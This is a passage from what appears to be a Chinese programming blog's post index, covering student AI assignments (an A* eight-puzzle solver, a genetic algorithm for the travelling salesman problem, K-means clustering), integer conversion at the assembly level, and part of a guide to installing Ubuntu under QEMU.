child, int iniInd, int childInd) &#123; // 交换字符，完成移动\t\tchild[iniInd] = child[childInd];\t\tchild[childInd] = &#x27;0&#x27;;\t&#125;\tvoid printPath(unordered_map&lt;string, string&gt;&amp; pre, string path) &#123; // 输出路径\t\tstack&lt;string&gt; st;\t\twhile (path != &quot;None&quot;) &#123;\t\t\tst.emplace(path);\t\t\tpath = pre[path];\t\t&#125;\t\tint cnt = 0;\t\twhile (++cnt &amp;&amp; !st.empty()) &#123;\t\t\tstring str = st.top();\t\t\tst.pop();\t\t\tcout &lt;&lt; &quot;step&quot; &lt;&lt; cnt &lt;&lt; &quot;:  &quot; &lt;&lt; str.substr(0, 3) &lt;&lt; endl\t\t\t\t&lt;&lt; &quot;        &quot; &lt;&lt; str.substr(3, 3) &lt;&lt; endl &lt;&lt; &quot;        &quot; &lt;&lt;\t\t\t\tstr.substr(6, 3) &lt;&lt; endl &lt;&lt; string(15, &#x27;-&#x27;) &lt;&lt; endl;\t\t&#125;\t&#125;public:\tvoid eightDigitalQues(const string&amp; ini, const string&amp; target) &#123;\t\ttargetStr = target;\t\tpriority_queue&lt;state&gt; open;\t\tunordered_set&lt;string&gt; close;\t\tunordered_map&lt;string, string&gt; pre;\t\topen.emplace(ini, 0);\t\tpre[ini] = &quot;None&quot;;\t\twhile (!open.empty()) &#123;\t\t\tstring n = open.top().str;\t\t\tint d = open.top().depth;\t\t\topen.pop();\t\t\tclose.emplace(n);\t\t\tif (n == target) &#123;\t\t\t\tbreak;\t\t\t&#125;\t\t\tint iniInd = n.find(&#x27;0&#x27;);\t\t\tint x = iniInd / 3, y = iniInd % 3;\t\t\tfor (const auto&amp; dir : dirs) &#123; // 尝试选择四个方向\t\t\t\tint nx = x + dir[0], ny = y + dir[1];\t\t\t\tif (nx &gt;= 0 &amp;&amp; nx &lt;= 2 &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt;= 2) &#123; // 满足移动后下标满足条件\t\t\t\t\tint childInd = nx * 3 + ny;\t\t\t\t\tstate childState(n, d + 1);\t\t\t\t\tswapChr(childState.str, iniInd, childInd);\t\t\t\t\tif (close.count(childState.str)) // 如该状态已加入close表，则跳过\t\t\t\t\t\tcontinue;\t\t\t\t\topen.emplace(childState); // 加入满足条件的子状态\t\t\t\t\tpre[childState.str] = n; // 更新前驱\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t\tprintPath(pre, target); // 输出流程\t\treturn;\t&#125;&#125;;string Solution::targetStr;int main() &#123;\tSolution S;\tstring ini, target;\tcin &gt;&gt; ini &gt;&gt; target;\tS.eightDigitalQues(ini, target);\tcin.get();&#125;\n运行结果输入原状态：283164705, 目标状态：123804765\n输出\n","categories":["人工智能"],"tags":["算法","数据结构","人工智能"]},{"title":"人工智能作业 使用遗传算法解决旅行商问题","url":"/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/","content":"遗传算法（Genetic Algorithm，GA）最早是由美国的 John holland于20世纪70年代提出,该算法是根据大自然中生物体进化规律而设计提出的。是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，是一种通过模拟自然进化过程搜索最优解的方法。本文利用遗传算法解决经典的NP问题——旅行商问题，并加深对该算法的理解。\n\n问题描述有若干个城市，每个城市给定一个坐标，一个旅行商需要经过每个城市各一遍且不能重复经过城市，起点可以任意选择，求旅行商经过所有城市的总距离的最小值及其最优路径。\n数据结构与算法设计数据结构设计\nstruct point\n\n从文本提取的城市的坐标数据，包含 id, x, y.\n\nconst int idNum = 100; // 种群个体数\n\n表示种群的个体数目，即每次迭代所包含的数据的个数。\n\nconst double variProbability = 0.05; // 变异概率\n\n遗传过程可能导致变异，变异次数 = 变异概率 * 种群个体数。\n\nvector&lt;point&gt; coords; // 各点坐标\n\n从文本文件中提取的坐标向量。\n\nvector&lt;vector&lt;double&gt;&gt; distance; // 各点距离\n\n两城市之间的距离矩阵，distance[i][j]的值为城市i与城市j的距离。\n\nvector&lt;vector&lt;int&gt;&gt; route; // 路线种群\n\n种群向量，每个 route[i] 表示一个个体，即 TSP 问题的一个解路径。\n\nvector&lt;pair&lt;double, int&gt;&gt; fitness; // 各路线的适应度(适应度，种群下标)\n\n各路线个体的适应度，fitness[i].second 表示该个体在 route 向量中的下标，即route[fitness[i].second] 的适应度为 fitness[i].first.\n\nvector&lt;int&gt; bestRoute; // 最优路线\n\n当前迭代过程中出现过的最优个体。\n\ndouble minDistance = INT32_MAX; // 最短路径\n\n当前迭代过程中出现过的最短路径。\n算法设计\nvoid geneticsAlgorithm(const string&amp; path)\n\n算法总体设计，首先根据指定的path路径读取文本并提取数据于 coords 向量，再根据 coords 数据初始化距离矩阵，并随机生成初始路线。\n在迭代循环中，依次执行计算适应度、自然选择、交叉遗传、随机变异操作，并在每 100 次迭代后打印当前最优解。\n\nvector&lt;point&gt; extraData(const string&amp; path)\n\n根据指定的 path 路径从文本中提取数据，实现算法为以指定文本文件初始化文件 ifstream 对象 fileStream，并每次用字符串 s 接收 fileStream 输出的值，并使用 stoi() 函数将其转换成 int 类型并存储。循环往复，直到文件末尾。\n\nvoid initDistance()\n\n根据 coords 中的数据初始化城市距离矩阵，算法实现为简单的二重循环+计算，在此不过多赘述。\n\nvoid initRoute()\n\n随机生成初始种群，实现算法为先将序号 0~coords.size() 顺序排序，再使用 random_shuffle() 函数将其打乱顺序作为个体放入 route 中，按此方式生成 idNum 个个体，作为初始种群。\n\nvoid updateFitness()\n\n更新适应度，首先计算各个体 route[i] 的距离总和D，并更新此时的最短距离及最优解，计算适应度为 fitness = 1 / D，即总距离越大，适应度越低，越有可能被淘汰。\n\nvoid selectAlgorithm()\n\n根据个体的适应度进行自然选择，自然选择的算法很多，例如轮盘赌算法等，本实验采用的是最简单的优先级淘汰，即每次淘汰适应度排名后 50% 的个体。\n\nvoid crossAlgorithm()\n\n交叉遗传算法，本算法为遗传算法的核心部分，目的是根据自然选择后的个体之间进行交叉遗传得到新的个体。交叉遗传算法同样有很多，本实验采用的是 Subtour Exchange Crossover 算法，算法原理如下：\n\n首先随机选取双亲之一 parent1 的基因序列的一段。\n\n依次遍历另一个双亲 parent2 的基因序列，若当前遍历的基因值与步骤1中随机选取的基因段中某个基因值相同，则按基因出现顺序进行交换。\n\n\n\n\nvoid variationAlgorithm()\n\n随机变异，实现算法为选取前 idNum * variProbability 个个体随机变异，变异方式为随机选取两个城市进行顺序交换。\n算法结果分析输入数据为一个文本文件 data.txt，每行有三个整数并以空格分隔开，依次为城市编号，城市所在横坐标，城市所在纵坐标。\n输出结果\n\n输出结果分析\n可见，随着迭代次数的增加，最短路径变化的越来越慢，最终收敛于一个确定的值，至此，可认为算法已经基本找到了最优解。\n此外，根据数据不难看出，遗传算法在收敛速度较慢，这是由于种群进化到后期，个体之间的差异越来越小，得到更优个体的概率也越小，越到后期取得的收益越小，因此可以考虑在最优解连续一定次数（如 500 次）时终止算法，并认为此时得到的基本上为最优解。\n完整代码#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;struct point &#123;\tint id;\tint x, y;\tpoint(int id, int x, int y) : id(id), x(x), y(y) &#123;&#125;&#125;;class TSP &#123;private:\tconst int idNum = 100; // 种群个体数\tconst double variProbability = 0.05; // 变异概率\tvector&lt;point&gt; coords; // 各点坐标\tvector&lt;vector&lt;double&gt;&gt; distance; // 各点距离\tvector&lt;vector&lt;int&gt;&gt; route; // 路线种群\tvector&lt;pair&lt;double, int&gt;&gt; fitness; // 各路线的适应度(适应度，种群下标)\tvector&lt;int&gt; bestRoute; // 最优路线\tdouble minDistance = INT32_MAX; // 最短路径\tvector&lt;point&gt; extraData(const string&amp; path) &#123;\t\tifstream fileStream(path);\t\tint id = 0, x = 0, y = 0;\t\tvector&lt;point&gt; res;\t\twhile (!fileStream.eof()) &#123;\t\t\tstring s;\t\t\tfileStream &gt;&gt; s;\t\t\tid = stoi(s);\t\t\tfileStream &gt;&gt; s;\t\t\tx = stoi(s);\t\t\tfileStream &gt;&gt; s;\t\t\ty = stoi(s);\t\t\tres.emplace_back(id, x, y);\t\t&#125;\t\tfileStream.close();\t\treturn res;\t&#125;\tvoid initDistance() &#123;\t\tint n = coords.size();\t\tdistance = vector&lt;vector&lt;double&gt;&gt;(n, vector&lt;double&gt;(n, 0));\t\tfor (int i = 0; i &lt; n; ++i) &#123;\t\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\t\tdouble dis = sqrt(pow(coords[i].x - coords[j].x, 2) + pow(coords[i].y - coords[j].y, 2));\t\t\t\tdistance[i][j] = dis;\t\t\t&#125;\t\t&#125;\t&#125;\tvoid initRoute() &#123;\t\tvector&lt;int&gt; temp;\t\tfor (int i = 0; i &lt; coords.size(); ++i) &#123;\t\t\ttemp.emplace_back(i);\t\t&#125;\t\tfor (int i = 0; i &lt; idNum; ++i) &#123;\t\t\trandom_shuffle(temp.begin(), temp.end());\t\t\troute.emplace_back(temp);\t\t&#125;\t\tfitness = vector&lt;pair&lt;double, int&gt;&gt;(idNum); // 初始化适应度大小\t&#125;\tvoid updateFitness() &#123; // 适应度函数 f = 1/D（D为路线的距离总和）\t\tfor (int i = 0; i &lt; idNum; ++i) &#123;\t\t\tdouble D = 0;\t\t\tfor (int j = 0; j &lt; route[i].size(); ++j) &#123;\t\t\t\tint xi = 0, yi = 0;\t\t\t\tif (j != route[i].size() - 1) &#123;\t\t\t\t\txi = route[i][j], yi = route[i][j + 1];\t\t\t\t&#125;\t\t\t\telse &#123;\t\t\t\t\txi = route[i][j], yi = route[i][0];\t\t\t\t&#125;\t\t\t\tD += sqrt(pow(coords[xi].x - coords[yi].x, 2) + pow(coords[xi].y - coords[yi].y, 2));\t\t\t&#125;\t\t\tif (minDistance &gt; D) &#123;\t\t\t\tminDistance = D;\t\t\t\tbestRoute = route[i];\t\t\t&#125;\t\t\tfitness[i].first = 1.0 / D;\t\t\tfitness[i].second = i;\t\t&#125;\t&#125;\tvoid selectAlgorithm() &#123; // 根据适应度带权选择个体\t\tsort(fitness.begin(), fitness.end(), greater&lt;pair&lt;double, int&gt;&gt;());\t\tvector&lt;vector&lt;int&gt;&gt; newRoute = route;\t\tfor (int i = 0; i &lt; idNum; ++i) &#123;\t\t\tnewRoute[i] = route[fitness[i / 2].second];\t\t&#125;\t\troute = newRoute;\t\trandom_shuffle(route.begin(), route.end());\t&#125;\tvoid crossAlgorithm() &#123;\t\tvector&lt;int&gt; child1;\t\tvector&lt;int&gt; child2;\t\tfor (int i = 0; i &lt; idNum - 1; i += 2) &#123;\t\t\t// route[i] 与 route[i + 1] 交叉\t\t\tchild1 = route[i];\t\t\tchild2 = route[i + 1];\t\t\tint rVal1 = rand() % route[0].size();\t\t\tint rVal2 = rand() % route[0].size();\t\t\tint p1 = min(rVal1, rVal2), p2 = max(rVal1, rVal2); // 随机确定左右区间\t\t\tint k = p1;\t\t\tfor (int j = 0; j &lt; route[0].size(); ++j) &#123;\t\t\t\tauto it = find(route[i].begin() + p1, route[i].begin() + p2 + 1, route[i + 1][j]);\t\t\t\tif (it != route[i].begin() + p2 + 1) &#123;\t\t\t\t\tswap(child2[j], child1[k++]);\t\t\t\t&#125;\t\t\t&#125;\t\t\troute[i] = child1;\t\t\troute[i + 1] = child2;\t\t&#125;\t&#125;\tvoid variationAlgorithm() &#123; // 随机交换路线中的两城市顺序\t\tfor (int i = 0; i &lt; idNum * variProbability; ++i) &#123;\t\t\tint randInd = rand() % idNum;\t\t\tint rVal1 = rand() % route[0].size();\t\t\tint rVal2 = rand() % route[0].size();\t\t\tswap(route[randInd][rVal1], route[randInd][rVal2]);\t\t&#125;\t&#125;public:\tvoid geneticsAlgorithm(const string&amp; path) &#123;\t\tcoords = extraData(path); // 从文本提取坐标数据\t\tinitDistance(); // 初始化距离矩阵\t\tinitRoute(); // 随机生成初始路线\t\tfor (int i = 0; i &lt; 20000; ++i) &#123;\t\t\tupdateFitness(); // 计算适应度\t\t\tselectAlgorithm(); // 自然选择\t\t\tcrossAlgorithm(); // 交叉遗传\t\t\tvariationAlgorithm(); // 随机变异\t\t\tif (i % 100 == 0) &#123; // 每 100 次打印当前最优解\t\t\t\tcout &lt;&lt; &quot;迭代次数：&quot; &lt;&lt; i &lt;&lt; &quot;\\t&quot; &lt;&lt; &quot;当前最短路径：&quot; &lt;&lt; minDistance &lt;&lt; endl;\t\t\t&#125;\t\t&#125;\t&#125;\tvector&lt;int&gt; getBestRoute() &#123; return bestRoute; &#125;\tdouble getMinDistance() &#123; return minDistance; &#125;\tvector&lt;point&gt; getCoords() &#123; return coords; &#125;&#125;;int main() &#123;\tsrand((unsigned)time(nullptr));\tTSP tsp;\ttsp.geneticsAlgorithm(&quot;./data.txt&quot;);\tvector&lt;int&gt; bestRoute = tsp.getBestRoute();\tdouble minDistance = tsp.getMinDistance();\tcout &lt;&lt; &quot;最短路径长度为：&quot; &lt;&lt; minDistance &lt;&lt; endl;\tcout &lt;&lt; &quot;最短路径如下所示：&quot; &lt;&lt; endl;\tfor (int i = 0; i &lt; bestRoute.size(); ++i) &#123;\t\tcout &lt;&lt; bestRoute[i] &lt;&lt; &quot;\\t&quot;;\t\tif (i &gt; 0 &amp;&amp; (i + 1) % 10 == 0) cout &lt;&lt; endl;\t&#125;\t// debug\tcout &lt;&lt; &quot;\\n---------------------------------------------------&quot; &lt;&lt; endl;\tdouble D = 0.0;\tauto coords = tsp.getCoords();\tfor (int j = 0; j &lt; coords.size(); ++j) &#123;\t\tint xi = 0, yi = 0;\t\tif (j != coords.size() - 1) &#123;\t\t\txi = bestRoute[j], yi = bestRoute[j + 1];\t\t&#125;\t\telse &#123;\t\t\txi = bestRoute[j], yi = bestRoute[0];\t\t&#125;\t\tD += sqrt(pow(coords[xi].x - coords[yi].x, 2) + pow(coords[xi].y - coords[yi].y, 2));\t&#125;\tcout &lt;&lt; &quot;计算得到 D = &quot; &lt;&lt; D &lt;&lt; endl;&#125;\n总结本次实验通过一个旅行商问题的例子，让我很好地理解了遗传算法的设计思路及其用来求解问题的方式。\n实验中遇到的最多的问题还是在交叉遗传部分，对于该部分算法的选择与设计花了不少功夫，起初为了方便起见，本想直接采取双亲基因序列各取一部分的方式，但这种方式在 TSP 问题中显然是不适用的，因为这样拼接而成的子代无法保证 TSP 问题所要求的“每个城市各走一遍”的原则。最终在权衡之下，选择了 Subtour Exchange Crossover 算法，代码实现不算复杂且性能良好。\n另一个问题就是遗传算法的收敛速度较慢，我在多次进行试验之后发现对于一个 127 个点的数据，算法普遍会在 15000 次之后基本收敛，因此循环次数设定为了 20000 次，以便更好地对数据进行分析。\n变异概率的设定同样值得考虑，一般设定在 0.01~0.1，因为变异并不总是有利的，因此不宜过大；同样不宜过小，否则不易得到最优的结果，收敛速度将更慢。\n","categories":["人工智能"],"tags":["算法","人工智能","旅行商问题"]},{"title":"从机器指令的角度看一些位级操作","url":"/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/","content":"C/C++ 中有时会遇到一些位级操作，通常是一些隐式的类型转换，它们往往很难凭借高级语言层面的直觉来理解或记忆。本文旨在分析这些操作对应的汇编代码，从机器指令的角度来理解这类操作。\n\n补码数转换为更长的无符号数int main() &#123;\tshort a = -12345;\tunsigned b = a;\tcout &lt;&lt; a &lt;&lt; &quot; &quot; &lt;&lt; b &lt;&lt; endl; // -12345 4294954951&#125;\n首先看以上这个示例，一个短整型数据（2 字节）强制类型转换为无符号整型数据（4 字节）之后，得到的值却是一个看似毫不相关的结果。\nvoid showBytes(unsigned char* ptr, size_t sz) &#123;\tfor (int i = 0; i &lt; sz; ++i) &#123;\t\tprintf(&quot;%.2x &quot;, ptr[i]);\t&#125;\tprintf(&quot;\\n&quot;);&#125;\n首先，为了更好地分析这类位级操作，这里编写了一个简单的字节打印函数，通过将指向变量的指针强制类型转换为 unsigned char * ，便可以很方便地通过增加数组下标来实现对每个字节的访问。\nint main() &#123;\tshort a = -12345;\tshowBytes((unsigned char*)&amp;a, sizeof(a)); // c7 cf\tunsigned b = a;\tshowBytes((unsigned char*)&amp;b, sizeof(b)); // c7 cf ff ff&#125;\n通过打印变量 a 和 b 的位级表示，发现 a 的位级表示为：c7 ff，而 b 的位级表示为 c7 ff ff ff，这表明 b 在位级层面实际上进行了符号扩展（注意此处字节序为小端表示，即字节地址由高到低为 ff ff ff c7），再将其解释为无符号类型，用表达式表示就是：unsigned b = (unsigned)(int)a;.\n在 MSVC 编译器下对前面的代码进行编译，得到以下代码：\nmov eax, 0ffffcfc7hmov word ptr [a], axmovsx eax, word ptr [a]mov dword ptr [b], eax\n将 a 赋值给 b 的指令为 movsx，该指令的作用是将源数据经过符号扩展后存入目的地址，相关的指令还有 movzx，作用是将源数据经过零扩展后存入目的地址，因此程序实际上是将 a 的比特位符号扩展后再存入 b 中。事实上，要对一个变量进行何种扩展，决定因素是源数据的类型，而与目标类型无关，这是 C 语言标准所规定的。\n截断补码数int main() &#123;\tint a = INT32_MIN;\tshort b = a;\tcout &lt;&lt; a &lt;&lt; &quot; &quot; &lt;&lt; b &lt;&lt; endl; // -2147483648 0&#125;\n4 字节的整型转换为 2 字节的短整型，同样产生了令人意想不到的结果。\nint main() &#123;\tint a = INT32_MIN;\tshowBytes((unsigned char*)&amp;a, sizeof(a)); // 00 00 00 80\tshort b = a;\tshowBytes((unsigned char*)&amp;b, sizeof(b)); // 00 00&#125;\n由于整型的字节长度大于短整型，因此在类型转换过程中，必然要进行数位的截断，关键在于截断策略的选择。对于无符号数来说，很容易想到直接将高位字节部分截断，因为这样才能保证当整型数值 a 不是太大（小于短整型所能表示的最大数值）时，类型转换后数值保持不变。而根据上述字节打印结果，可以看到补码数值的截断策略与无符号数一致，以下汇编代码清楚地表明了这一点：\nmov dword ptr [a], 80000000hmov ax, word ptr [a]mov word ptr [b], ax\n在进行类型转换时，程序只是简单地将变量 a 的一个字（word），即两字节存入 b 中。因此补码数的截断，其本质上还是位级层面的截断，与该补码所表示的数值并无关系，不涉及到任何的算术运算，这就使得在对负数进行截断时，往往产生出乎意料的结果。\n","categories":["计算机体系结构"],"tags":["位运算","计算机体系结构"]},{"title":"人工智能作业 使用K-means算法进行聚类分析","url":"/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8K-means%E7%AE%97%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%81%9A%E7%B1%BB%E5%88%86%E6%9E%90/","content":"本文将介绍如何使用 K-means 算法对给定的坐标数据进行聚类分析。\n使用K-means算法进行聚类分析问题描述\nK-means算法对data中数据进行聚类分析\n（1）算法原理描述\n（2）算法结构\n（3）写出K-means具体功能函数（不能直接调用sklearn.cluster(Means)功能函数)具体函数功能中返回值包括 数据类标签，累中心，输入包括：数据，类别数\n（4）可视化画图，不同类数据采用不同颜色\n（5）算法分析\n  类类方差，平均方差，不同初始点对聚类结果的影响？\n  如何解决？\n\n算法描述\n数据结构设计：   数据点使用自定义数据类型point，包含x和y两个变量。  中心点一个大小为k的数组center进行存储，从文本中提取的坐标数据使用可变数组coords进行存储，不同的坐标点分组采用一个可变的二维数组group进行存储。  \n\n函数介绍： \nextraCoords(): 从文本文件中提取坐标数据并存入coords中，提取算法为：首先使用传入文件路径初始化文件IO流fileStream，再逐个输出fileStream中的数据。若为字母，则不接收。否则两个一组接收，并使用stod()函数接收到的字符串转换成double类型并存入coords中。  \ndrawFigures()：用于将传入坐标数组的数据绘制在屏幕上，由于该函数代码逻辑较为简单且程序段较短，因此设置为内联函数以减少函数调用开销。  \nclusterAnalysis()：核心算法程序，即Kmeans算法的原理： \n\n首先输入分组k 的值，即通过指定分组数目得到 k 个分组； \n\n从数据集中随机选取 k 个数据点作为初始中心；  \n\n对集合中每一数据点，计算与每一个中心点的距离，离哪个中心点距离近，就加入中心点对应的组。  \n\n对k个组计算距离的平均值  \n\n如果两次求得的均值距离的平均值小于某一个设置的阈值，可以认为我们进行的聚类已经达到期望的结果，算法终止。  \n\n如果两次求得的均值距离大于某一个设置的阈值，继续迭代，如果迭代次数大于设定的值，那么终止。  \n\n\n\n程序运行说明：本程序绘图功能借助了第三方库easyX，如需运行请先前往安装：https://easyx.cn/  程序运行前将数据文件放置于源程序根目录下，并更名为data.txt.  \n\n\n代码#include&lt;graphics.h&gt;#include&lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;#include&lt;vector&gt;using namespace std;class Kmeans &#123;private:\tstruct point\t&#123;\t\tdouble x, y;\t\tpoint(double x = 0, double y = 0) : x(x), y(y) &#123;&#125;\t&#125;;\tconst int iterLimit = 100;\tconst double criDiff = 1e-6;\tvector&lt;point&gt; extraCoords(const string&amp; path) &#123;\t\tifstream fileStream(path);\t\tvector&lt;point&gt; coords;\t\twhile (!fileStream.eof()) &#123;\t\t\tstring s;\t\t\tfileStream &gt;&gt; s;\t\t\tif (isalpha(s[0]))\t\t\t\tcontinue;\t\t\tdouble x = 0, y = 0;\t\t\tx = stod(s);\t\t\tfileStream &gt;&gt; s;\t\t\ty = stod(s);\t\t\tcoords.emplace_back(x, y);\t\t&#125;\t\tfileStream.close();\t\treturn coords;\t&#125;\tinline void drawFigures(const vector&lt;point&gt;&amp; coords) &#123;\t\tfor (const auto&amp; coord : coords) &#123;\t\t\tint x = static_cast&lt;int&gt;(coord.x * 50);\t\t\tint y = static_cast&lt;int&gt;(coord.y * 50);\t\t\trectangle(x - 1, y - 1, x + 1, y + 1);\t\t&#125;\t&#125;public:\tvoid clusterAnalysis(const string&amp; path, int k) &#123;\t\tauto coords = extraCoords(path);\t\tvector&lt;point&gt; center(k);\t\tsrand((unsigned int)time(NULL));\t\tfor (int i = 0; i &lt; k; ++i) &#123;\t\t\tint randIndex = rand() % coords.size();\t\t\tcenter[i] = coords[randIndex];\t\t&#125;\t\tdouble difference = DBL_MAX;\t\tvector&lt;vector&lt;point&gt;&gt; group(k);\t\tfor (int times = 0; difference / k &gt; criDiff &amp;&amp; times &lt; iterLimit; ++times) &#123; // 迭代\t\t\tfor (auto&amp; g : group) &#123; // 清空分组\t\t\t\tg.clear();\t\t\t&#125;\t\t\tdifference = 0;\t\t\tfor (int i = 0; i &lt; coords.size(); ++i) &#123; // 将所有点根据离中心点的距离进行归类\t\t\t\tdouble minDis = DBL_MAX;\t\t\t\tint minInd = 0;\t\t\t\tfor (int j = 0; j &lt; center.size(); ++j) &#123;\t\t\t\t\tdouble dis = sqrt(pow((center[j].x - coords[i].x), 2) \t\t\t\t\t\t+ pow((center[j].y - coords[i].y), 2));\t\t\t\t\tif (dis &lt; minDis) &#123;\t\t\t\t\t\tminDis = dis;\t\t\t\t\t\tminInd = j;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t\tgroup[minInd].emplace_back(coords[i]);\t\t\t&#125;\t\t\tfor (int i = 0; i &lt; k; ++i) &#123; // 更新各组的中心点\t\t\t\tdouble avgX = 0, avgY = 0;\t\t\t\tfor (int j = 0; j &lt; group[i].size(); ++j) &#123;\t\t\t\t\tavgX += group[i][j].x;\t\t\t\t\tavgY += group[i][j].y;\t\t\t\t&#125;\t\t\t\tavgX /= group[i].size();\t\t\t\tavgY /= group[i].size();\t\t\t\tdifference += sqrt(pow((center[i].x - avgX), 2)\t\t\t\t\t+ pow((center[i].y - avgY), 2));\t\t\t\t\tcenter[i] = point(avgX, avgY);\t\t\t&#125;\t\t\t//debug\t\t\tcout &lt;&lt; &quot;times: &quot; &lt;&lt; times &lt;&lt; endl;\t\t\tcout &lt;&lt; &quot;central point: &quot; &lt;&lt; endl;\t\t\tfor (const auto&amp; c : center) &#123;\t\t\t\tcout &lt;&lt; c.x &lt;&lt; &quot; &quot; &lt;&lt; c.y &lt;&lt; endl;\t\t\t&#125;\t\t\tcout &lt;&lt; &quot;---------------------------------&quot; &lt;&lt; endl;\t\t&#125;\t\tinitgraph(800, 800);\t\tsetorigin(400, 400);\t\tvector&lt;int&gt; color = &#123; RED, GREEN, BLUE, YELLOW &#125;;\t\tfor (int i = 0; i &lt; k; ++i) &#123;\t\t\tsetcolor(color[i % color.size()]);\t\t\tcircle(center[i].x * 50, center[i].y * 50, 3); // 绘制中心\t\t\tdrawFigures(group[i]); // 绘制各点\t\t&#125;\t\tcin.get();\t\tclosegraph();\t&#125;&#125;;int main() &#123;\tKmeans kmeans;\tkmeans.clusterAnalysis(&quot;./data.txt&quot;, 4);&#125;\n实验结果分析\n\n\n\n\n迭代次数\n中心点1\n中心点2\n中心点3\n中心点4\n\n\n\n\n1\n(0.227226, 3.04983)\n(2.78284, -2.05254)\n(-3.52982, 3.21916)\n(-3.53974, -2.89384)\n\n\n2\n(1.88871, 3.14692)\n(2.86928, -2.54779)\n(-2.77105, 2.77596)\n(-3.38237, -2.94734)\n\n\n3\n(2.62653, 3.10868)\n(2.80293, -2.73151)\n(-2.46154, 2.78738)\n(-3.38237, -2.94734)\n\n\n4\n(2.62653, 3.10868)\n(2.80293, -2.73151)\n(-2.46154, 2.78738)\n(-3.38237, -2.94734)\n\n\n\n\n运行结果如图所示，输入的  k 为4，将各点分成了4类，每一类用不同的颜色进行表示，类的中心点为该颜色下的小圆圈。根据肉眼观察，聚类的结果较为合理。但是由于 K-means 算法初始点的选取是随机的，因此可能会导致聚类的结果不尽相同，如下图所示：  \n\n\n\n\n\n迭代次数\n中心点1\n中心点2\n中心点3\n中心点4\n\n\n\n\n1\n(2.72345, -2.26244)\n(-3.01524, -2.54552)\n(-0.17289, 3.07096)\n(-4.01179, -3.20733)\n\n\n2\n(2.86928, -2.54779)\n(-2.77631, -2.51946)\n(0.0469085, 3.05288)\n(-4.27929, -3.17607)\n\n\n3\n(2.86928, -2.54779)\n(-2.73086, -2.60718)\n(0.0469085, 3.05288)\n(-4.35316, -3.03354)\n\n\n4\n(2.86928, -2.54779)\n(-2.73086, -2.60718)\n(0.0469085, 3.05288)\n(-4.35316, -3.03354)\n\n\n\n\n可见，由于初始中心点的选取不同，最终导致聚类的结果产生了差异，且本次聚类的结果相对来说不够合理。\n实验体会本次实验算法原理并不复杂，关键在于对文本数据的提取与转换，以及将数据可视化的绘制在屏幕上。文本数据提取部分我采用了文件IO流与字符串转换函数stod()。而数据可视化方面，由于本实验只有其画点这一极为基础的图形需求，因此我采用了一个较为轻量化图形库easyX，使用简单且代码量很少。\n","categories":["人工智能"],"tags":["算法","数据结构","人工智能"]},{"title":"使用QEMU安装并启动一个Ubuntu发行版","url":"/2025/10/31/%E4%BD%BF%E7%94%A8QEMU%E5%AE%89%E8%A3%85%E5%B9%B6%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AAUbuntu%E5%8F%91%E8%A1%8C%E7%89%88/","content":"之前自己编译 QEMU 跑模拟器/虚拟机基本都是跑的一个基于 buildroot 构建的小型根文件系统，虽然也能够完成一些基础的测试，但是功能完备性上相比发行版来说还是要差很多，而且如果想添加新的软件环境也比较麻烦。因此这两天花了点时间倒腾了一下环境，把 QEMU 安装和运行发行版的流程走通，便于后续的学习和研究。\n\n安装系统发行版我选择的是 Ubuntu，没有什么别的原因，只是因为用的最多。而已经安装好 Ubuntu 系统的磁盘镜像可能不太好找（官网只看到 RISC-V 架构有 pre-installed 版本），因此我选择下载 iso 镜像，然后手动安装。这里可以直接选择通过清华镜像源下载：\nwget https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/noble/ubuntu-24.04.3-live-server-amd64.iso\n我下载的是较新的版本，因此 seabios 可能不支持，需要更现代的固件，虚拟机场景下通常是 OVMF，使用包管理工具安装一下：\nsudo apt install ovmf\n找到安装好的 OVMF 固件，通常在目录 /usr/share/OVMF 目录下。\n最后创建一个 QEMU 的虚拟磁盘文件 QCOW2（大小自行选择，我的选择为 20G），用作虚拟机的磁盘，它相比传统文件类型的优势在于可以动态扩容。\nqemu-img create -f qcow2 ubuntu-vm.qcow2 20G\n最后使用下面所示的 QEMU 启动参数进行启动：\nqemu-system-x86_64 \\    -machine q35,accel=kvm \\    -cpu host \\    -m 8G \\    -smp 4 \\    -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.fd \\    -drive if=pflash,format=raw,file=/usr/share/OVMF/OVMF_VARS_4M.fd \\    -cdrom ubuntu-24.04.3-live-server-amd64.iso \\    -boot order=d \\    -hda ubuntu-vm.qcow2 \\    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\    -device e1000,netdev=net0 \\    -serial mon:stdio \\    -display none\n其中的 -cdrom 参数相当于将装有操作系统镜像的光盘插入我们的虚拟机器 q35 上，-boot order=d 相当于系统上电进行引导时最先检查的存储设备为光盘，这个过程和我们现实中为一台裸机电脑安装操作系统如出一辙。\n由于我的本机 Linux 环境为 WSL2，因此选择纯命令行安装的方式，需要进行下列额外操作将安装器的输出显示在串口：\n\n启动后会出现 GRUB 菜单，选中 Try or Install Ubuntu Server，按 e 进入编辑模式。\n找到以 linux 开头的那一行，在末尾加上 console=ttyS0，如 linux        /casper/vmlinuz  --- console=ttyS0。\n按 Ctrl+X 或 F10 启动。\n\n运行系统具体安装过程中的选项在此就不过多介绍了，安装完成后，下次启动时可以去掉 cdrom 和 boot 参数：\nqemu-system-x86_64 \\    -machine q35,accel=kvm \\ 